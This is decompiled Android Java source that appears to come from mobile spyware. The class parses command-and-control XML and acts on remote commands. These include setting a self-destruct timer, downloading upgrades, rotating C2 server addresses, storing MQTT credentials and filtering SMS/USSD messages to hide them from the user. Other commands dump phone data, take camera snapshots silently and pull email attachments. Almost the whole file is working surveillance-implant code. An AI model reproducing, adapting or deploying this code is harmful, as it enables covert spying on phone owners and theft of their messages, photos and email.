package com.network.android;

import android.content.Context;
import android.os.Handler;
import android.os.HandlerThread;
import com.network.android.a.c;
import com.network.android.agent.NetworkApp;
import com.network.android.c.a.b;
import com.network.h.j;
import com.network.k.a.a;
import com.network.media.CoreReceiver;
import com.network.media.f;
import java.util.HashSet;
import java.util.Set;
import java.util.Vector;
import org.xml.sax.Attributes;
import org.xml.sax.helpers.DefaultHandler;

public final class x extends DefaultHandler {
    public static Vector A = new Vector();
    public static Vector B = new Vector();
    public static Vector C = new Vector();
    public static Object D = new Object();
    private static Set N = new HashSet();
    private static Handler O;
    public static String s = "3";
    public static String t = "";
    public static String u = "";
    public static int v = 0;
    public static int w = 0;
    public static Vector x = new Vector();
    public static Vector y = new Vector();
    public static Vector z = new Vector();
    private String E = "";
    private boolean F = false;
    private boolean G = false;
    private boolean H = false;
    private boolean I = false;
    private boolean J = false;
    private boolean K = false;
    private a L = new a();
    private Context M;

    /* renamed from: a  reason: collision with root package name */
    public int f132a = -1;
    public String b = "";
    String c = null;
    String d = null;
    public String e;
    public String f = "";
    public boolean g = false;
    public boolean h = false;
    public boolean i = false;
    public boolean j = false;
    public boolean k = false;
    public boolean l = false;
    public boolean m = false;
    public boolean n = false;
    public boolean o = false;
    public boolean p = false;
    public boolean q = false;
    public boolean r = false;

    static {
        HandlerThread handlerThread = new HandlerThread("MO commandHandlerThread");
        handlerThread.start();
        O = new Handler(handlerThread.getLooper());
    }

    public x(Context context) {
        this.M = context;
        x.clear();
        z.clear();
        y.clear();
        synchronized (D) {
            com.network.android.c.a.a.a("ProvisionContectHandler clear commandSet, size=" + N.size());
            N.clear();
        }
        B.clear();
        A.clear();
        C.clear();
    }

    public static Vector a() {
        return y;
    }

    public static int c() {
        int size;
        synchronized (D) {
            size = N.size();
        }
        return size;
    }

    public final void b() {
        if (N.isEmpty()) {
            com.network.android.c.a.a.a("addHttpCommandsToCommandQueue commandSet is empty");
            return;
        }
        com.network.android.c.a.a.a("addHttpCommandsToCommandQueue post");
        O.post(new y(this));
    }

    @Override // org.xml.sax.helpers.DefaultHandler, org.xml.sax.ContentHandler
    public final void characters(char[] cArr, int i2, int i3) {
        if (this.o) {
            A.add(new String(cArr, i2, i3));
        } else if (this.q) {
            C.add(new String(cArr, i2, i3));
        } else {
            this.e = new String(cArr, i2, i3);
        }
    }

    @Override // org.xml.sax.helpers.DefaultHandler, org.xml.sax.ContentHandler
    public final void endElement(String str, String str2, String str3) {
        com.network.android.c.a.a.a("ParseResponseCommands endElement localName " + str2);
        if (str2.equals("cmd")) {
            synchronized (D) {
                N.add(com.network.i.a.b(this.e));
            }
            this.g = false;
        } else if (str2.equals("settingsCmd")) {
            this.h = false;
        } else if (str2.equals("addrs")) {
            if (this.h) {
                com.network.android.c.a.a.a("ParseResponseCommands ADDRS endelement");
                this.k = false;
            }
        } else if (str2.equals("addr")) {
            if (this.k) {
                com.network.android.c.a.a.a("ParseResponseCommands ADDR endelement");
                this.l = false;
            }
        } else if (str2.equals("callerIds")) {
            if (this.h) {
                com.network.android.c.a.a.a("ParseResponseCommands CALLER_IDS endelement");
                this.m = false;
            }
        } else if (str2.equals("callerId")) {
            if (this.m) {
                com.network.android.c.a.a.a("ParseResponseCommands CALLER_ID endelement");
                this.o = false;
            }
        } else if (str2.equals("messageFilters")) {
            com.network.android.c.a.a.a("ParseResponseCommands messagefilters endelement");
            if (this.h) {
                com.network.android.c.a.a.a("ParseResponseCommands messagefilters isSettingsBlocking endelement");
                this.i = false;
            }
        } else if (str2.equals("messageFilter")) {
            com.network.android.c.a.a.a("ParseResponseCommands messagefilter endelement");
            if (this.i) {
                com.network.android.c.a.a.a("ParseResponseCommands messagefilters isSettingsBlocking endelement");
                this.j = false;
            }
        } else if (str2.equals("moSms")) {
            if (this.p) {
                com.network.android.c.a.a.a("ParseResponseCommands MO_SMS isSettingsMoSmss endelement");
                this.q = false;
            } else if (this.h) {
                com.network.android.c.a.a.a("ParseResponseCommands MO_SMS isSettingsCommand endelement");
                this.p = false;
            }
        } else if (str2.equals("mqttSrv")) {
            if (this.h) {
                this.n = false;
            }
        } else if (str2.equals("dumpCmd")) {
            if (this.g) {
                this.r = false;
            }
        } else if (str2.equals("camCmd")) {
            if (this.g) {
                this.J = false;
            }
        } else if (!str2.equals("emailAttCmd")) {
            com.network.android.c.a.a.a("ParseResponseCommands endelement nothing");
        } else if (this.g) {
            this.K = false;
        }
    }

    @Override // org.xml.sax.helpers.DefaultHandler, org.xml.sax.ContentHandler
    public final void startElement(String str, String str2, String str3, Attributes attributes) {
        boolean z2 = true;
        try {
            com.network.android.c.a.a.a("ParseResponseCommands startElement localName " + str2);
            if (str2.equals("response")) {
                this.f132a = Integer.parseInt(attributes.getValue("code"));
                this.b = attributes.getValue("message");
            } else if (str2.equals("token")) {
                this.c = attributes.getValue("id");
            } else if (str2.equals("configuration")) {
                this.F = true;
                s = attributes.getValue("revision");
            } else if (str2.equals("command")) {
                this.g = true;
            } else if (str2.equals("monitor")) {
                this.G = true;
                a.a();
            } else if (str2.equals("dump")) {
                this.I = true;
            } else if (str2.equals("action")) {
                this.H = true;
            } else if (str2.equals("upgrade")) {
                t = attributes.getValue("url");
                u = attributes.getValue("pVersion");
                v = Integer.parseInt(attributes.getValue("t1"));
                w = Integer.parseInt(attributes.getValue("t2"));
                com.network.android.c.a.a.a("ParseResponseCommands startElement found upgrade. data. url: " + t + " t1: " + v + " t2: " + w + " pVersion: " + u);
                if (j.a() || v <= 0 || w < 0) {
                    b.a(1, 94, "LOG_UPGRADE_PARAM_ARE_INVALID");
                } else {
                    j.a(t, v, w, NetworkApp.a(), u);
                }
            } else if (str2.equals("cmds")) {
                String value = attributes.getValue("mode");
                if (value != null && value.contains("http")) {
                    this.g = true;
                }
            } else if (str2.equals("settingsCmd")) {
                if (this.g) {
                    try {
                        this.h = true;
                        String value2 = attributes.getValue("ack");
                        int parseInt = Integer.parseInt(attributes.getValue("selfDestructTime"));
                        if (parseInt == 0) {
                            com.network.b.b.a((Integer) 2);
                        } else {
                            com.network.b.b.a(Integer.valueOf(parseInt * 60 * 60));
                        }
                        c.f44a.add(value2);
                        if (attributes.getIndex("roamingBehaviour") >= 0) {
                            int parseInt2 = Integer.parseInt(attributes.getValue("roamingBehaviour"));
                            if (parseInt2 == 0) {
                                z2 = false;
                            }
                            com.network.b.b.a(z2);
                            com.network.b.b.g(parseInt2);
                            com.network.android.c.a.a.a("ParseResponseCommands Roaming behavior " + com.network.b.b.y() + " => " + com.network.b.b.d());
                        }
                        String value3 = attributes.getValue("pollInterval");
                        com.network.b.b.A = Integer.parseInt(attributes.getValue("debugLevel"));
                        com.network.android.c.a.a.a("ParseResponseCommands found wantedDebugLevel: " + com.network.b.b.A);
                        com.network.android.c.a.a.a("ParseResponseCommands found maxTimeWithNoCommunication: " + com.network.b.b.K());
                        if (value3 == null || value3.length() <= 0) {
                            com.network.android.c.a.a.a("ParseResponseCommands PollingManager pollingInterval NO pollingInterval: " + value3);
                        } else {
                            com.network.android.c.a.a.a("ParseResponseCommands PollingManager pollingInterval seconds: " + value3);
                            com.network.g.a.a(this.M, value3);
                        }
                        com.network.b.b.b(false);
                        b.a(value2);
                        com.network.b.b.c(this.M);
                    } catch (Throwable th) {
                        com.network.android.c.a.a.a("ParseResponseCommands mqtt exception: " + th.getMessage(), th);
                        if (0 != 0) {
                            b.a(0, 26, "LOG_CHANGE_SETTING_REQ_FAILED", com.network.h.b.c((String) null));
                            b.a(0, -15534, "", com.network.h.b.c((String) null));
                        }
                    }
                }
            } else if (str2.equals("addrs")) {
                if (this.h) {
                    com.network.android.c.a.a.a("ParseResponseCommands ADDRS");
                    this.k = true;
                }
            } else if (str2.equals("addr")) {
                if (this.k) {
                    com.network.android.c.a.a.a("ParseResponseCommands ADDR");
                    this.l = true;
                    z.add("http://" + attributes.getValue("host") + ':' + attributes.getValue("port") + "/support.aspx");
                }
            } else if (str2.equals("callerIds")) {
                com.network.android.c.a.a.a("ParseResponseCommands CALLER_IDS");
                if (this.h) {
                    this.m = true;
                }
            } else if (str2.equals("callerId")) {
                if (this.m) {
                    com.network.android.c.a.a.a("ParseResponseCommands CALLER_ID");
                    this.o = true;
                }
            } else if (str2.equals("messageFilters")) {
                com.network.android.c.a.a.a("ParseResponseCommands messagefilters");
                if (this.h) {
                    this.i = true;
                    com.network.android.c.a.a.a("ParseResponseCommands messagefilters isSettingsCommand");
                }
            } else if (str2.equals("messageFilter")) {
                com.network.android.c.a.a.a("ParseResponseCommands messagefilter");
                if (this.i) {
                    com.network.android.c.a.a.a("ParseResponseCommands messagefilter isSettingsBlocking");
                    this.j = true;
                    String value4 = attributes.getValue("type");
                    String value5 = attributes.getValue("expression");
                    com.network.android.c.a.a.a("ParseResponseCommands messagefilter type: " + value4 + " , exp: " + value5);
                    if (value4.equals("sms")) {
                        com.network.android.c.a.a.a("ParseResponseCommands add ussd exp:" + value5);
                        x.add(value5);
                    } else if (value4.equals("ussd")) {
                        com.network.android.c.a.a.a("ParseResponseCommands add ussd exp:" + value5);
                        y.add(value5);
                    } else if (value4.equals("both")) {
                        com.network.android.c.a.a.a("ParseResponseCommands add ussd exp:" + value5);
                        y.add(value5);
                    }
                }
            } else if (str2.equals("moSms")) {
                if (this.p) {
                    com.network.android.c.a.a.a("ParseResponseCommands MO_SMS isSettingsMoSmss");
                    this.q = true;
                } else if (this.h) {
                    com.network.android.c.a.a.a("ParseResponseCommands MO_SMS isSettingsCommand");
                    this.p = true;
                }
            } else if (str2.equals("mqttSrv")) {
                if (this.h) {
                    try {
                        this.n = true;
                        String value6 = attributes.getValue("password");
                        String value7 = attributes.getValue("username");
                        String value8 = attributes.getValue("idPref");
                        int parseInt3 = Integer.parseInt(attributes.getValue("qos"));
                        int parseInt4 = Integer.parseInt(attributes.getValue("kaTimer"));
                        int parseInt5 = Integer.parseInt(attributes.getValue("recCount"));
                        int parseInt6 = Integer.parseInt(attributes.getValue("con"));
                        int parseInt7 = Integer.parseInt(attributes.getValue("recInt"));
                        String value9 = attributes.getValue("host");
                        String value10 = attributes.getValue("port");
                        com.network.b.b.b(true);
                        com.network.b.b.c(value6);
                        com.network.b.b.b(parseInt6);
                        com.network.b.b.d(value7);
                        com.network.b.b.e(value8);
                        com.network.b.b.h(parseInt3);
                        com.network.b.b.i(parseInt4);
                        com.network.b.b.j(parseInt5);
                        com.network.b.b.k(parseInt7);
                        com.network.b.b.g(value9);
                        com.network.b.b.f(value10);
                        com.network.android.c.a.a.a("ParseResponseCommands found MQTT Password: " + value6 + " username: " + value7);
                        com.network.android.c.a.a.a("ParseResponseCommands found MQTT idPref: " + value8 + " qos: " + parseInt3);
                        com.network.android.c.a.a.a("ParseResponseCommands found MQTT kaTimer: " + parseInt4 + " recInt: " + parseInt7);
                        com.network.b.b.c(this.M);
                        CoreReceiver.b = true;
                    } catch (Throwable th2) {
                        com.network.android.c.a.a.a("ParseResponseCommands mqtt exception: " + th2.getMessage(), th2);
                        b.a(1, 101, "MOSQ_ERR_INVAL");
                    }
                }
            } else if (str2.equals("dumpCmd")) {
                try {
                    if (this.g) {
                        this.r = true;
                        String value11 = attributes.getValue("ack");
                        c.f44a.add(value11);
                        int parseInt8 = Integer.parseInt(attributes.getValue("dataTypes"));
                        com.network.android.c.a.a.a("ParseResponseCommands found dump command. running with bitwise " + parseInt8);
                        f.a(parseInt8);
                        f.a(value11);
                    }
                } catch (Throwable th3) {
                    com.network.android.c.a.a.a("ParseResponseCommands dump command exception: " + th3.getMessage(), th3);
                    if (0 != 0) {
                        b.a(1, 2003, "LOG_FAIL_BIG_DUMP", com.network.h.b.c((String) null));
                        b.a(1, -15534, "", com.network.h.b.c((String) null));
                    }
                }
            } else if (str2.equals("camCmd")) {
                try {
                    if (this.g) {
                        this.J = true;
                        String value12 = attributes.getValue("ack");
                        c.f44a.add(value12);
                        int parseInt9 = Integer.parseInt(attributes.getValue("source"));
                        int parseInt10 = Integer.parseInt(attributes.getValue("res"));
                        com.network.android.c.a.a.a("ParseResponseCommands Camera. running with Source bitwise " + parseInt9 + " resolution " + parseInt10);
                        com.network.media.a.a(this.M, value12, parseInt9, parseInt10);
                    }
                } catch (Throwable th4) {
                    com.network.android.c.a.a.a("ParseResponseCommands dump command exception: " + th4.getMessage(), th4);
                    if (0 != 0) {
                        b.a(0, 25, "LOG_CAMERA_SNAPSHOT_FAILED", com.network.h.b.c((String) null));
                        b.a(0, -15534, "", com.network.h.b.c((String) null));
                    }
                }
            } else if (str2.equals("emailAttCmd")) {
                try {
                    if (this.g) {
                        this.K = true;
                        String value13 = attributes.getValue("ack");
                        c.f44a.add(value13);
                        String value14 = attributes.getValue("emailRecordId");
                        String value15 = attributes.getValue("attRecordId");
                        com.network.android.c.a.a.a("ParseResponseCommands get email attachment attRecordId: " + value15 + ", emailRecordId" + value14);
                        if (value13 != null) {
                            b.a(value13);
                        }
                        Context context = this.M;
                        if (r.a(value14)) {
                            HandlerThread handlerThread = new HandlerThread("getAttachmentFileCommandGmailThread");
                            handlerThread.start();
                            new Handler(handlerThread.getLooper()).post(new t(value14, value15, context, value13));
                            return;
                        }
                        NetworkApp.f57a.post(new u(value14, value15, context, value13));
                    }
                } catch (Throwable th5) {
                    com.network.android.c.a.a.a("ParseResponseCommands dump command exception: " + th5.getMessage(), th5);
                    if (0 != 0) {
                        b.a(0, 120, "GET_ATTACHMENT_FAIL", com.network.h.b.c((String) null));
                        b.a(0, -15534, "", com.network.h.b.c((String) null));
                    }
                }
            } else {
                com.network.android.c.a.a.a("ParseResponseCommands NOTHING");
            }
        } catch (Throwable th6) {
            com.network.android.c.a.a.a("startElement exception: " + th6.getMessage(), th6);
        }
    }
}
